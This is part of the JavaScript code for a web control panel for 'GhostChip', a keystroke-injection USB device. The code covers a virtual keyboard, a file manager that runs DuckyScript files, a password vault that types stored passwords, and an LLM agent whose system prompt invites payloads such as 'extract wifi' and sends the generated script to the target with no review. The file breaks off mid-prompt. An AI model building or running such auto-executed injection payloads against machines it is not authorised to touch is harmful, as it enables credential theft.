    script = mods.join(' ') + ' ' + (processedKey.length === 1 ? processedKey : processedKey.toUpperCase());
    // Reset all modifiers after combo
    kbActiveMods = { shift: false, ctrl: false, alt: false, gui: false };
    kbCapsState = 0;
    updateKeyboardKeyCasing();
    ['Ctrl', 'Alt', 'Shift', 'Gui'].forEach(m => {
      const el = $(`kb${m}`);
      if (el) el.classList.remove('active');
    });
  } else {
    if (processedKey.length === 1) {
      script = 'STRING ' + processedKey;
    } else {
      script = processedKey.toUpperCase();
    }
  }

  // Single-tap shift auto-reverts after one keypress (not caps lock mode=2)
  if (kbCapsState === 1) {
    kbCapsState = 0;
    kbActiveMods.shift = false;
    updateKeyboardKeyCasing();
    const el = $('kbShift');
    if (el) el.classList.remove('active');
  }

  $('kbStatus').textContent = 'Sending: ' + script + (shiftOn ? ' [SHIFT]' : '');
  deviceFetch('/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'duckyscript=' + encodeURIComponent(script)
  }).then(() => {
    setTimeout(() => { if ($('kbStatus')) $('kbStatus').textContent = 'Ready.'; }, 500);
  });
}

function kbMacro(m) {
  $('kbStatus').textContent = 'Executing macro...';
  deviceFetch('/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'duckyscript=' + encodeURIComponent(m)
  }).then(() => {
    setTimeout(() => { if ($('kbStatus')) $('kbStatus').textContent = 'Ready.'; }, 800);
  });
}


// ═══════════════════════════════════════════════════
//  FILE MANAGER
// ═══════════════════════════════════════════════════

var fmCurrentPath = '/';
var fmSelectedFile = null;
var fmRunBusy = false;

function fmBase() {
  const b = BASE();
  if (b === '') return location.origin;
  return b || 'http://192.168.4.1';
}

async function fmFetch(path) {
  const url = getProxyUrl(fmBase() + path);
  try {
    return await fetch(url, {
      headers: { 'Accept': '*/*', 'Referer': fmBase() + '/file-manager' }
    });
  } catch (e) {
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open('GET', url, true);
      xhr.setRequestHeader('Accept', '*/*');
      xhr.onload = () => resolve({ ok: xhr.status < 400, status: xhr.status, text: async () => xhr.responseText, json: async () => JSON.parse(xhr.responseText) });
      xhr.onerror = () => reject(new Error('Network error'));
      xhr.timeout = 8000; xhr.ontimeout = () => reject(new Error('Timeout'));
      xhr.send();
    });
  }
}

async function fmFetchPost(path) {
  const url = fmBase() + path;
  const crossOrigin = new URL(url).origin !== location.origin;
  const opts = crossOrigin
    ? { method: 'POST', mode: 'no-cors', body: null }
    : { method: 'POST', headers: { 'Accept': '*/*' }, body: null };
  return fetch(url, opts);
}

async function fmNavigate(path) {
  fmCurrentPath = path;
  fmSelectedFile = null;
  fmRenderBreadcrumb(path);
  await fmLoadList(path);
}

function fmRefresh() { fmNavigate(fmCurrentPath); }

function fmUp() {
  if (fmCurrentPath === '/') return;
  const parent = fmCurrentPath.split('/').filter(Boolean).slice(0, -1).join('/');
  fmNavigate(parent ? '/' + parent : '/');
}

function fmRenderBreadcrumb(path) {
  const parts = path.split('/').filter(p => p);
  let crumbs = [{ label: '⌂ root', path: '/' }];
  let built = '';
  parts.forEach(p => { built += '/' + p; crumbs.push({ label: p, path: built }); });
  const bc = $('fmBreadcrumb');
  if (!bc) return;
  bc.innerHTML = crumbs.map((c, i) =>
    '<span class="fm-crumb' + (i === crumbs.length - 1 ? ' active' : '') + '" onclick="fmNavigate(\'' + c.path.replace(/'/g, "\\'") + '\')">' + escHtml(c.label) + '</span>'
  ).join('<span class="fm-sep">›</span>');
}

async function fmLoadList(path) {
  const list = $('fmList');
  if (!list) return;
  list.innerHTML = '<div class="skeleton"></div><div class="skeleton"></div><div class="skeleton"></div>';
  try {
    const r = await fmFetch('/fm/list?path=' + encodeURIComponent(path));
    const text = await r.text();
    let data;
    try { data = JSON.parse(text); } catch { data = []; }
    const items = Array.isArray(data) ? data : (data.files || data.entries || []);
    if (!items.length) { list.innerHTML = '<div class="empty-state">Empty folder</div>'; return; }
    items.sort((a, b) => {
      const aD = a.dir === true || a.type === 'dir' || a.isDir || a.directory;
      const bD = b.dir === true || b.type === 'dir' || b.isDir || b.directory;
      if (aD && !bD) return -1; if (!aD && bD) return 1;
      return (a.name || '').localeCompare(b.name || '');
    });
    list.innerHTML = items.map(item => {
      const isDir = item.dir === true || item.type === 'dir' || item.isDir || item.directory;
      const name = item.name || item.filename || '';
      const size = item.size != null ? fmFormatSize(item.size) : '';
      const iPath = (path === '/' ? '' : path) + '/' + name;
      const sp = iPath.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
      const sn = name.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
      const icon = isDir
        ? '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>'
        : fmFileIcon(name);
      return '<div class="fm-item' + (isDir ? ' fm-dir' : '') + '" onclick="' + (isDir ? 'fmNavigate(\'' + sp + '\')' : 'fmSelectFile(\'' + sp + '\',\'' + sn + '\',false,this)') + '">' +
        '<div class="fm-item-icon">' + icon + '</div>' +
        '<div class="fm-item-info"><div class="fm-item-name">' + escHtml(name) + '</div>' + (!isDir && size ? '<div class="fm-item-size">' + size + '</div>' : '') + '</div>' +
        (isDir ? '<span class="fm-arrow">›</span>' : '') + '</div>';
    }).join('');
  } catch (e) {
    list.innerHTML = '<div class="empty-state">Failed to load — check connection<br><small style="opacity:.6">' + escHtml(e.message) + '</small></div>';
    toast('FM: Load failed', 'err');
  }
}

function fmFileIcon(name) {
  const ext = (name.split('.').pop() || '').toLowerCase();
  if (['txt', 'ducky', 'ds', 'ps1', 'sh', 'bat', 'py'].includes(ext))
    return '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>';
  return '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>';
}

function fmFormatSize(bytes) {
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
  return (bytes / 1048576).toFixed(1) + ' MB';
}

function fmSelectFile(path, name, isDir, el) {
  fmSelectedFile = { path, name, isDir };
  document.querySelectorAll('.fm-item').forEach(e => e.classList.remove('fm-selected'));
  document.querySelectorAll('.fm-file-actions').forEach(e => e.remove());
  if (el) el.classList.add('fm-selected');
  if (!el) return;
  const actions = document.createElement('div');
  actions.className = 'fm-file-actions';
  actions.innerHTML =
    '<button class="fm-inline-btn fm-inline-run" onclick="event.stopPropagation(); fmRunSelected()">Run</button>' +
    '<button class="fm-inline-btn" onclick="event.stopPropagation(); fmDownloadSelected()">⬇ Save</button>';
  el.appendChild(actions);
}

function fmClearSelection() {
  fmSelectedFile = null;
  document.querySelectorAll('.fm-item').forEach(e => e.classList.remove('fm-selected'));
  document.querySelectorAll('.fm-file-actions').forEach(e => e.remove());
}

async function fmRunSelected() {
  if (!fmSelectedFile || fmRunBusy) return;
  fmRunBusy = true;
  try {
    await fmFetchPost('/fm/run?path=' + encodeURIComponent(fmSelectedFile.path));
    toast('Script running: ' + fmSelectedFile.name + ' ✓');
    fmClearSelection();
  } catch (e) {
    toast('Run sent. Check device status.', 'warn');
    fmClearSelection();
  } finally {
    fmRunBusy = false;
  }
}

// ─── Edit file from File Manager ───
var fmEditingPath = null; // tracks currently edited device file path

async function fmEditSelected() {
  if (!fmSelectedFile) return;
  const { path, name } = fmSelectedFile;
  toast('Loading ' + name + '…', 'warn', 3000);
  try {
    // Use fmFetch which already handles cross-origin correctly
    const r = await fmFetch('/fm/download?path=' + encodeURIComponent(path));
    const text = await r.text();
    // Load into editor
    $('editor').value = text;
    updateLines();
    localStorage.setItem('gc_script', text);
    $('fileName').textContent = name;
    // Track editing path for quick-save
    fmEditingPath = path;
    setEditorEditMode(name, path);
    // Navigate to editor
    const scriptNav = document.querySelectorAll('.nav-item')[0];
    if (scriptNav) goPage('scripts', scriptNav);
    closeTool('filemanager');
    toast('Editing ' + name + ' — make changes then SAVE ✓');
  } catch (e) {
    toast('Could not load file: ' + e.message, 'err');
  }
}

function setEditorEditMode(name, path) {
  // Show edit mode indicator in toolbar
  let badge = $('editModeBadge');
  if (!badge) {
    badge = document.createElement('div');
    badge.id = 'editModeBadge';
    badge.className = 'edit-mode-badge';
    const toolbar = document.querySelector('.editor-toolbar');
    if (toolbar) toolbar.appendChild(badge);
  }
  badge.innerHTML = '<span class="edit-mode-dot"></span><span class="edit-mode-label">EDIT: ' + escHtml(name) + '</span><button class="edit-mode-clear" onclick="clearEditorEditMode()" title="Exit edit mode">✕</button>';
  badge.style.display = 'flex';
}

function clearEditorEditMode() {
  fmEditingPath = null;
  const badge = $('editModeBadge');
  if (badge) badge.style.display = 'none';
}

async function fmSaveEditBack() {
  if (!fmEditingPath) { showSaveModal(); return; }
  const script = $('editor').value;
  if (!script.trim()) { toast('Editor is empty', 'warn'); return; }
  const name = fmEditingPath.split('/').pop();
  const folder = fmEditingPath.substring(0, fmEditingPath.lastIndexOf('/')) || '/';
  const btn = $('runBtn'); // disable execute btn while saving
  toast('Saving back to ' + fmEditingPath + '…', 'warn', 3000);
  try {
    const uploadUrl = fmBase() + '/fm/upload?path=' + encodeURIComponent(folder);
    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
    const blob = new Blob([script], { type: 'text/plain' });
    const file = new File([blob], name, { type: 'text/plain' });
    const fd = new FormData();
    fd.append('file', file, name);
    const opts = crossOrigin
      ? { method: 'POST', mode: 'no-cors', body: fd }
      : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };
    await fetch(uploadUrl, opts);
    toast('Saved → ' + fmEditingPath + ' ✓');
    // If the user was trying to star — re-open fav modal with path linked
    if (window._afterSaveOpenFav) {
      window._afterSaveOpenFav = false;
      window._pendingFavDevicePath = fmEditingPath;
      setTimeout(() => {
        $('addFavModal').style.display = 'flex';
        showFavForm(fmEditingPath);
      }, 400);
    }
  } catch (e) {
    toast('Save sent — verify in File Manager', 'warn', 4000);
  }
}

function fmDownloadSelected() {
  if (!fmSelectedFile) return;
  const url = fmBase() + '/fm/download?path=' + encodeURIComponent(fmSelectedFile.path);
  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
  if (isMobile) {
    const opened = window.open(url, '_blank', 'noopener');
    if (!opened) location.href = url;
    toast('Opening download: ' + fmSelectedFile.name + '...');
    return;
  }
  const a = document.createElement('a');
  a.href = url; a.download = fmSelectedFile.name; a.target = '_blank';
  document.body.appendChild(a); a.click(); document.body.removeChild(a);
  toast('Downloading ' + fmSelectedFile.name + '...');
}

function fmUploadClick() { if ($('fmUploadInput')) $('fmUploadInput').click(); }

async function fmHandleUpload(event) {
  const files = Array.from(event.target.files);
  if (!files.length) return;
  const uploadUrl = fmBase() + '/fm/upload?path=' + encodeURIComponent(fmCurrentPath);
  const crossOrigin = new URL(uploadUrl).origin !== location.origin;
  for (const file of files) {
    toast('Uploading ' + file.name + '...', 'warn', 4000);
    try {
      const fd = new FormData();
      fd.append('file', file, file.name);
      const opts = crossOrigin
        ? { method: 'POST', mode: 'no-cors', body: fd }
        : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };
      await fetch(uploadUrl, opts);
      toast('Uploaded ' + file.name + ' ✓');
    } catch (e) {
      toast('Upload sent. Refreshing folder...', 'warn', 2500);
    }
  }
  event.target.value = '';
  await fmLoadList(fmCurrentPath);
}

setTimeout(() => {
  const dz = $('fmDropzone');
  if (!dz) return;
  dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('drag'); });
  dz.addEventListener('dragleave', () => dz.classList.remove('drag'));
  dz.addEventListener('drop', e => {
    e.preventDefault(); dz.classList.remove('drag');
    const files = Array.from(e.dataTransfer.files);
    if (!files.length) return;
    const dt = new DataTransfer();
    files.forEach(f => dt.items.add(f));
    $('fmUploadInput').files = dt.files;
    fmHandleUpload({ target: $('fmUploadInput') });
  });
}, 800);

function fmShowMkdir() { if ($('fmMkdirForm')) { $('fmMkdirForm').style.display = 'block'; setTimeout(() => $('fmMkdirName') && $('fmMkdirName').focus(), 100); } }
function fmHideMkdir() { if ($('fmMkdirForm')) { $('fmMkdirForm').style.display = 'none'; if ($('fmMkdirName')) $('fmMkdirName').value = ''; } }

async function fmCreateFolder() {
  const name = $('fmMkdirName') ? $('fmMkdirName').value.trim() : '';
  if (!name) { toast('Enter a folder name', 'warn'); return; }
  const folderPath = (fmCurrentPath === '/' ? '' : fmCurrentPath) + '/' + name;
  try {
    await fmFetchPost('/fm/mkdir?path=' + encodeURIComponent(folderPath));
    toast('Folder created: ' + name + ' ✓');
    fmHideMkdir();
    await fmLoadList(fmCurrentPath);
  } catch (e) { toast('Create failed: ' + e.message, 'err'); }
}

// ═══════════════════════════════════════════════════
//  AI ASSISTANT AGENT
// ═══════════════════════════════════════════════════
var assistRecog = null;
var assistListening = false;
var assistOS = 'windows';

function setAssistOS(os, btn) {
  assistOS = os;
  btn.parentElement.querySelectorAll('.os-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  toast('Target: ' + os.toUpperCase());
}

function stopAssistant() {
  if (window.speechSynthesis) window.speechSynthesis.cancel();
  if (assistRecog) {
    assistRecog.onend = null; // Prevent auto-restart
    assistRecog.stop();
  }
  assistListening = false;
  $('assistMicBtn').classList.remove('listening');
  $('assistStatus').textContent = 'Tap to speak';
}

function clearAssistantChat() {
  const chat = $('assistantChat');
  if (chat) chat.innerHTML = '<div class="chat-msg bot">Chat cleared. How can I help you next?</div>';
  if ($('assistScript')) $('assistScript').value = '';
}

function toggleAssistantVoice() {
  const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
  if (!SpeechRecognition) {
    toast('Speech recognition not supported', 'err');
    return;
  }

  if (assistListening && assistRecog) {
    assistRecog.stop();
    return;
  }

  assistRecog = new SpeechRecognition();
  assistRecog.lang = 'en-US';
  assistRecog.interimResults = false;
  assistRecog.continuous = false;

  const btn = $('assistMicBtn');
  const status = $('assistStatus');

  assistRecog.onstart = () => {
    assistListening = true;
    btn.classList.add('listening');
    status.textContent = 'Listening...';
    if (window.speechSynthesis) window.speechSynthesis.cancel();
  };

  assistRecog.onresult = (e) => {
    const text = e.results[0][0].transcript;
    addChatMsg('user', text);
    processAssistantRequest(text);
  };

  assistRecog.onerror = (err) => {
    assistListening = false;
    btn.classList.remove('listening');
    status.textContent = 'Tap to speak';
    if (err.error !== 'no-speech') toast('Mic error: ' + err.error, 'err');
  };

  assistRecog.onend = () => {
    assistListening = false;
    btn.classList.remove('listening');
    if (status.textContent === 'Listening...') status.textContent = 'Tap to speak';
  };

  assistRecog.start();
}

function addChatMsg(role, text) {
  const chat = $('assistantChat');
  if (!chat) return;
  const msg = document.createElement('div');
  msg.className = 'chat-msg ' + role;
  msg.textContent = text;
  chat.appendChild(msg);
  chat.scrollTop = chat.scrollHeight;
}

async function processAssistantRequest(query) {
  const apiKey = GROQ_KEY || localStorage.getItem('gc_groq_key') || '';
  if (!apiKey) {
    addChatMsg('bot', 'Please save your Groq API key in Settings first.');
    speakAssistant('Please save your API key in Settings first.', false);
    return;
  }

  try {
    const res = await fetch('https://api.groq.com/openai/v1/chat/completions', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + apiKey },
      body: JSON.stringify({
        model: GROQ_MODEL,
        messages: [
          {
            role: 'system',
            content: `You are the GhostChip AI Agent. Target OS: ${assistOS}.
            1. If the user asks a general question (e.g. "what is python", "who are you"), answer briefly as an expert. Set "script" to null.
            2. If the user asks for a technical action or HID payload (e.g. "open notepad", "extract wifi"), provide a short text response AND the DuckyScript for ${assistOS}.
            You MUST respond in JSON: {"text": "verbal reply", "script": "duckyscript or null"}.
            Use proper DuckyScript syntax: DELAY, STRING, ENTER, GUI, ALT, CTRL, SHIFT, TAB, SPACE, UP, DOWN, LEFT, RIGHT, REM, F1-F12, CAPSLOCK, etc. for windows use GUI for windows key and for mac spotlight use GUI SPACE there is no CMD.
            *NOTE: ALWAYS add DELAY 2000 after each action line in DuckyScript*,
            Text replies must be under 100 words.`
          },
          { role: 'user', content: query }
        ],
        temperature: 0.2,
        response_format: { type: "json_object" }
      })
    });

    const data = await res.json();
    if (!res.ok) throw new Error(data.error?.message || 'API Error');

    const reply = JSON.parse(data.choices[0].message.content);

    addChatMsg('bot', reply.text);

    if (reply.script) {
      $('assistScript').value = reply.script;
      toast('Agent executing script...', 'ok');
      deviceFetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'duckyscript=' + encodeURIComponent(reply.script)
      });
      // For scripts, maybe don't auto-listen immediately to avoid loop, but let's try it.
      speakAssistant(reply.text, true);
    } else {
      speakAssistant(reply.text, true);
    }

    $('assistStatus').textContent = 'Tap to speak';
  } catch (e) {
    addChatMsg('bot', 'Error: ' + e.message);
    speakAssistant('I encountered an error.', true);
    $('assistStatus').textContent = 'Tap to speak';
  }
}

function speakAssistant(text, autoListen = false) {
  if (!window.speechSynthesis) return;
  const utterance = new SpeechSynthesisUtterance(text);
  utterance.rate = 1.0;
  utterance.pitch = 1.1;

  utterance.onend = () => {
    // Only auto-listen if we are still in the assistant tool
    const panel = $('tool-assistant');
    if (autoListen && panel && panel.style.display !== 'none') {
      setTimeout(() => {
        if (!assistListening) toggleAssistantVoice();
      }, 300);
    }
  };

  window.speechSynthesis.speak(utterance);
}

function copyAssistant() {
  const s = $('assistScript').value;
  if (!s) return;
  navigator.clipboard.writeText(s).then(() => toast('Copied ✓'));
}

function simulateAssistant() {
  const s = $('assistScript').value;
  if (!s) return;
  $('editor').value = s;
  simulatePayload();
}

// ─── Favourites Tool App ───
var toolFavCurrentFilter = 'all';

function filterToolFavs(tag, btn) {
  toolFavCurrentFilter = tag;
  document.querySelectorAll('#toolFavsFilter .fav-filter-btn').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  renderToolFavGrid();
}

async function renderToolFavGrid() {
  const grid = $('toolFavGrid');
  if (!grid) return;

  grid.innerHTML = '<div class="fav-empty"><span class="spin"></span> Loading...</div>';

  const list = await loadFavsFromDeviceDirectories(toolFavCurrentFilter);

  if (!list.length) {
    grid.innerHTML = '<div class="fav-empty">' +
      (toolFavCurrentFilter === 'all' ? 'No favourites yet on device.' : 'No ' + toolFavCurrentFilter + ' favourites yet.') +
      '</div>';
    return;
  }

  grid.innerHTML = list.map(fav => {
    const m = TAG_META[fav.tag] || TAG_META.custom;
    const fileName = fav.devicePath ? fav.devicePath.split('/').pop() : (fav.name || 'script.txt');
    const pathHtml = fav.devicePath
      ? `<div class="fav-device-path" title="${escHtml(fav.devicePath)}"><span class="fav-path-icon">📁</span><span class="fav-path-text">${escHtml(fav.devicePath)}</span></div>`
      : '';
    const metaText = `Device File`;
    return `<div class="fav-card ${m.cls}" id="tool-fav-${fav.id}">
      <div class="fav-card-top">
        <span class="fav-tag-badge ${m.cls}">${m.emoji} ${m.label}</span>
      </div>
      <div class="fav-card-name" onclick="runFavDirectly('${fav.id}')">${escHtml(fileName)}</div>
      <div class="fav-card-meta">${metaText}</div>
      ${pathHtml}
      <div style="display:flex;gap:6px;margin-top:auto;">
        <button class="fav-sync-btn" onclick="event.stopPropagation();runFavDirectly('${fav.id}')" style="flex:1" title="Execute directly from memory card">⚡ Run</button>
      </div>
    </div>`;
  }).join('');
}

// ─── Password Vault Tool App ───
var vaultEntries = [];

async function initVaultApp() {
  const grid = $('vaultGrid');
  if (!grid) return;
  grid.innerHTML = '<div class="fav-empty"><span class="spin"></span> Loading vault...</div>';

  try {
    try {
      await fmFetchPost('/fm/mkdir?path=%2FVault');
    } catch (e) { }

    const r = await fmFetch('/fm/list?path=%2FVault');
    const text = await r.text();
    let data;
    try { data = JSON.parse(text); } catch { data = []; }
    const items = Array.isArray(data) ? data : (data.files || data.entries || []);

    vaultEntries = [];
    items.forEach(item => {
      const isDir = item.dir === true || item.type === 'dir' || item.isDir || item.directory;
      if (!isDir) {
        const name = item.name || item.filename || '';
        if (name.endsWith('.txt')) {
          vaultEntries.push({
            name: name.replace(/\.txt$/, ''),
            path: '/Vault/' + name
          });
        }
      }
    });

    renderVaultGrid();
  } catch (e) {
    grid.innerHTML = '<div class="fav-empty">Failed to load Vault files.</div>';
  }
}

function renderVaultGrid() {
  const grid = $('vaultGrid');
  if (!grid) return;

  const query = ($('vaultSearch') ? $('vaultSearch').value : '').trim().toLowerCase();
  const filtered = vaultEntries.filter(e => e.name.toLowerCase().includes(query));

  if (!filtered.length) {
    grid.innerHTML = '<div class="fav-empty">' + (query ? 'No matching sites found.' : 'Vault is empty. Click + Add to save a password.') + '</div>';
    return;
  }

  grid.innerHTML = filtered.map(item => {
    return `<div class="fav-card tag-custom" id="vault-card-${item.name}">
      <div class="fav-card-top">
        <span class="fav-tag-badge tag-custom">🔐 Password</span>
        <button class="fav-del-btn" onclick="event.stopPropagation(); deleteVaultEntry('${escHtml(item.name)}')" title="Delete" style="background:none;border:none;color:var(--dim2);cursor:pointer;font-size:0.75rem;">✕</button>
      </div>
      <div class="fav-card-name" onclick="runVaultEntry('${escHtml(item.name)}')" style="cursor:pointer;">${escHtml(item.name)}</div>
      <div class="fav-card-meta">DuckyScript: ${escHtml(item.path)}</div>
      <div style="display:flex;gap:6px;margin-top:auto;width:100%;">
        <button class="fav-sync-btn" onclick="event.stopPropagation(); runVaultEntry('${escHtml(item.name)}')" style="flex:1;" title="Type password via USB">⚡ Type</button>
      </div>
    </div>`;
  }).join('');
}

function filterVaultList() {
  renderVaultGrid();
}

function showAddVaultModal() {
  $('vaultSiteName').value = '';
  $('vaultPassword').value = '';
  $('addVaultModal').style.display = 'flex';
  setTimeout(() => $('vaultSiteName') && $('vaultSiteName').focus(), 100);
}

function hideAddVaultModal() {
  $('addVaultModal').style.display = 'none';
}

async function confirmAddVault() {
  const site = $('vaultSiteName').value.trim();
  const password = $('vaultPassword').value.trim();

  if (!site) { toast('Enter a site name', 'warn'); return; }
  if (!password) { toast('Enter a password', 'warn'); return; }

  const safeSite = site.replace(/[^a-zA-Z0-9_\-]/g, '');
  if (!safeSite) { toast('Invalid site name (use letters, numbers, _ or -)', 'warn'); return; }

  const btn = $('vaultAddConfirmBtn');
  const oldText = btn.innerHTML;
  btn.innerHTML = '<span class="spin"></span> Saving…';
  btn.disabled = true;

  try {
    const content = `DELAY 500\nSTRING ${password}`;

    try {
      await fmFetchPost('/fm/mkdir?path=%2FVault');
    } catch (e) { }

    const uploadUrl = fmBase() + '/fm/upload?path=%2FVault';
    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
    const blob = new Blob([content], { type: 'text/plain' });
    const file = new File([blob], safeSite + '.txt', { type: 'text/plain' });
    const fd = new FormData();
    fd.append('file', file, safeSite + '.txt');

    const opts = crossOrigin
      ? { method: 'POST', mode: 'no-cors', body: fd }
      : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };

    await fetch(uploadUrl, opts);

    toast(`Saved /Vault/${safeSite}.txt ✓`);
    hideAddVaultModal();
    initVaultApp();
  } catch (e) {
    toast('Save failed', 'err');
  } finally {
    btn.innerHTML = oldText;
    btn.disabled = false;
  }
}

async function deleteVaultEntry(site) {
  if (!confirm(`Delete password for ${site}?`)) return;
  const path = `/Vault/${site}.txt`;
  try {
    await fmFetchPost('/fm/delete?path=' + encodeURIComponent(path));
    toast(`Deleted ${site} ✓`);
    initVaultApp();
  } catch (e) {
    toast(`Could not delete: ${e.message}`, 'err');
  }
}

async function runVaultEntry(site) {
  const path = `/Vault/${site}.txt`;
  toast(`Typing password for ${site}…`, 'warn', 3000);
  try {
    await fmFetchPost('/fm/run?path=' + encodeURIComponent(path));
    toast(`Password typed ✓`);
  } catch (e) {
    toast(`Typing sent. Check target.`, 'warn');
  }
}

// ─── Shortcuts Tool App ───
var shortcutsEntries = [];

async function initShortcutsApp() {
  const grid = $('shortcutsGrid');
  if (!grid) return;
  grid.innerHTML = '<div class="fav-empty"><span class="spin"></span> Loading shortcuts...</div>';

  try {
    try {
      await fmFetchPost('/fm/mkdir?path=%2FShortcuts');
    } catch (e) { }

    const r = await fmFetch('/fm/list?path=%2FShortcuts');
    const text = await r.text();
    let data;
    try { data = JSON.parse(text); } catch { data = []; }
    const items = Array.isArray(data) ? data : (data.files || data.entries || []);

    shortcutsEntries = [];
    items.forEach(item => {
      const isDir = item.dir === true || item.type === 'dir' || item.isDir || item.directory;
      if (!isDir) {
        const name = item.name || item.filename || '';
        if (name.endsWith('.txt')) {
          shortcutsEntries.push({
            name: name.replace(/\.txt$/, ''),
            path: '/Shortcuts/' + name
          });
        }
      }
    });

    renderShortcutsGrid();
  } catch (e) {
    grid.innerHTML = '<div class="fav-empty">Failed to load Shortcuts.</div>';
  }
}

function renderShortcutsGrid() {
  const grid = $('shortcutsGrid');
  if (!grid) return;

  const query = ($('shortcutsSearch') ? $('shortcutsSearch').value : '').trim().toLowerCase();
  const filtered = shortcutsEntries.filter(e => e.name.toLowerCase().includes(query));

  if (!filtered.length) {
    grid.innerHTML = '<div class="fav-empty">' + (query ? 'No matching shortcuts found.' : 'No shortcuts yet. Click + Add to create one.') + '</div>';
    return;
  }

  grid.innerHTML = filtered.map(item => {
    return `<div class="fav-card tag-recon" id="shortcut-card-${item.name}">
      <div class="fav-card-top">
        <span class="fav-tag-badge tag-recon">⚡ Shortcut</span>
        <button class="fav-del-btn" onclick="event.stopPropagation(); deleteShortcutEntry('${escHtml(item.name)}')" title="Delete" style="background:none;border:none;color:var(--dim2);cursor:pointer;font-size:0.75rem;">✕</button>
      </div>
      <div class="fav-card-name" onclick="runShortcutEntry('${escHtml(item.name)}')" style="cursor:pointer;">${escHtml(item.name)}</div>
      <div class="fav-card-meta">DuckyScript: ${escHtml(item.path)}</div>
      <div style="display:flex;gap:6px;margin-top:auto;width:100%;">
        <button class="fav-sync-btn" onclick="event.stopPropagation(); runShortcutEntry('${escHtml(item.name)}')" style="flex:1;" title="Execute shortcut immediately">⚡ Run</button>
      </div>
    </div>`;
  }).join('');
}

function filterShortcutsList() {
  renderShortcutsGrid();
}

function showAddShortcutModal() {
  $('shortcutName').value = '';
  $('shortcutScript').value = '';
  $('addShortcutModal').style.display = 'flex';
  setTimeout(() => $('shortcutName') && $('shortcutName').focus(), 100);
}

function hideAddShortcutModal() {
  $('addShortcutModal').style.display = 'none';
}

async function confirmAddShortcut() {
  const name = $('shortcutName').value.trim();
  const script = $('shortcutScript').value.trim();

  if (!name) { toast('Enter a shortcut name', 'warn'); return; }
  if (!script) { toast('Enter DuckyScript body', 'warn'); return; }

  const safeName = name.replace(/[^a-zA-Z0-9_\-]/g, '');
  if (!safeName) { toast('Invalid shortcut name (use letters, numbers, _ or -)', 'warn'); return; }

  const btn = $('shortcutAddConfirmBtn');
  const oldText = btn.innerHTML;
  btn.innerHTML = '<span class="spin"></span> Saving…';
  btn.disabled = true;

  try {
    try {
      await fmFetchPost('/fm/mkdir?path=%2FShortcuts');
    } catch (e) { }

    const uploadUrl = fmBase() + '/fm/upload?path=%2FShortcuts';
    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
    const blob = new Blob([script], { type: 'text/plain' });
    const file = new File([blob], safeName + '.txt', { type: 'text/plain' });
    const fd = new FormData();
    fd.append('file', file, safeName + '.txt');

    const opts = crossOrigin
      ? { method: 'POST', mode: 'no-cors', body: fd }
      : { method: 'POST', headers: { 'Accept': '*/*' }, body: fd };

    await fetch(uploadUrl, opts);

    toast(`Saved /Shortcuts/${safeName}.txt ✓`);
    hideAddShortcutModal();
    initShortcutsApp();
  } catch (e) {
    toast('Save failed', 'err');
  } finally {
    btn.innerHTML = oldText;
    btn.disabled = false;
  }
}

async function deleteShortcutEntry(name) {
  if (!confirm(`Delete shortcut ${name}?`)) return;
  const path = `/Shortcuts/${name}.txt`;
  try {
    await fmFetchPost('/fm/delete?path=' + encodeURIComponent(path));
    toast(`Deleted ${name} ✓`);
    initShortcutsApp();
  } catch (e) {
    toast(`Could not delete: ${e.message}`, 'err');
  }
}

async function runShortcutEntry(name) {
  const path = `/Shortcuts/${name}.txt`;
  toast(`Running shortcut ${name}…`, 'warn', 3000);
  try {
    await fmFetchPost('/fm/run?path=' + encodeURIComponent(path));
    toast(`Shortcut executed ✓`);
  } catch (e) {
    toast(`Shortcut sent. Check device.`, 'warn');
  }
}

// ═══════════════════════════════════════════════════════════════
//  AI AGENT — Browser-native LangGraph-style ReAct Agent
//  Think → Action → Observation loop powered by Groq API
// ═══════════════════════════════════════════════════════════════

let agentRunning = false;
let agentAbort = false;
let agentHistory = [];   // persists across runs within session
let agentInspectorOpen = false;
const AGENT_MODEL = 'nvidia/nemotron-3.5-lightning:free';

// ─── System Prompt ────────────────────────────────────────────
const AGENT_SYSTEM_PROMPT = `You are GhostChip AI Agent — an autonomous HID operator for a GhostChip ESP32 device that physically injects keystrokes, manages SD card files & directories, controls WiFi, and drives an RGB LED.

## STRICT OUTPUT FORMAT — ONE STEP PER RESPONSE

You MUST output EXACTLY ONE of these two formats per response, nothing else:

FORMAT A — When you need to call a tool:
Thought: <your reasoning>
Action: <exact_tool_name>
Action Input: <tool input — stop writing here, do NOT write Observation>

FORMAT B — When you are completely done:
